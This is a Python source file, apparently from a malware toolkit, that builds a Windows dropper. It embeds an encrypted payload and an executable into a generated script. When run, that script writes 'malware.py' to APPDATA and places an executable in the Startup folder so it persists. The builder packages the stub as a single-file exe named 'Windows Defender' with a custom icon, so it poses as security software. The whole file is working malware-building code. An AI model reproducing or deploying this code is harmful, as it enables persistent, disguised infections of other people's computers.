import sys
import os
import pexe37
from distutils.core import setup
import darkarp.malkit_modules.encrypt as encrypt
from shutil import rmtree
from threading import Thread
import time


def exebuild(target, include, output, icon="icon.ico"):
    sys.argv.append("pexe37")
    setup(
        options={
            "pexe37": {
                "compressed": True,
                "bundle_files": 1,
                "optimize": 2,
                "excludes": [
                    "pyreadline",
                    "pdb",
                    "unittest",
                    "inspect"
                    "difflib",
                    "doctest",

                ],
                "dll_excludes": ["msvcr71.dll", "Crypt32.dll", "tcl85.dll", "tk85.dll"],
                "includes": [f'{include}']
            }
        },
        zipfile=None,

        console=[{
            "script": target,
            "icon_resources": [(1, icon)]
        }]

    )
    if os.path.exists(f"{output}.exe"):
        os.remove(f"{output}.exe")
    os.rename(f"dist\\{target[:-3]}.exe", f"{output}.exe")
    rmtree("dist")
    return 0


def get_payload(filename: str):
    encrypt_file(filename)
    payload = []
    for line in open(filename, "rb"):
        payload.append(line)
    payload = b''.join(payload)
    decrypt_file(filename)
    return payload


def encrypt_file(filename: str):
    return print(encrypt.encrypt(filename=filename))


def decrypt_file(filename: str):
    return print(encrypt.fully_decrypt(filename=filename))


def gendie(filenames: list):
    for name in filenames:
        try:
            os.remove(f"cryptmod\\{name}.py")
        except Exception as err:
            os.remove(f"{name}.exe")
    return 0


def generate_payload(filename, destname, startup, icon):
    payload = get_payload(filename)
    exepayload = exe_bytes(startup)
    start_str = "startups='" + str(startup) + "'\n"
    APPDATA = "APPDATA = getenv('APPDATA')\n"
    STARTUP = "STARTUP = f'{APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{startups}.exe'\n"
    pyline = ""
    pyline += f"from os import getenv\n"
    pyline += start_str
    pyline += APPDATA
    pyline += STARTUP
    pyline += f"filename = 'malware.py'\n"
    pyline += "path2 = f'{APPDATA}\\\\{filename}'\n"
    pyline += f"payload = {payload}\n"
    pyline += f"exepayload = {exepayload}\n"
    pyline += f"with open(path2, 'wb') as f:\n"
    pyline += "    f.write(payload)\n"
    pyline += f"with open(STARTUP, 'wb') as f:\n"
    pyline += "    f.write(exepayload)"
    with open(f"{destname}.py", "wb") as f:
        f.write(pyline.encode())
    return f"{destname}"


def exe_bytes(filename: str):
    bytelist = []
    for line in open(f"{filename}.exe", "rb"):
        bytelist.append(line)
    bytelist = b''.join(bytelist)
    return bytelist


if __name__ == "__main__":
    exebuild(target="stub.py", include='darkarp.malkit_modules.encrypt',
             output='Windows Defender', icon="icon2.ico")
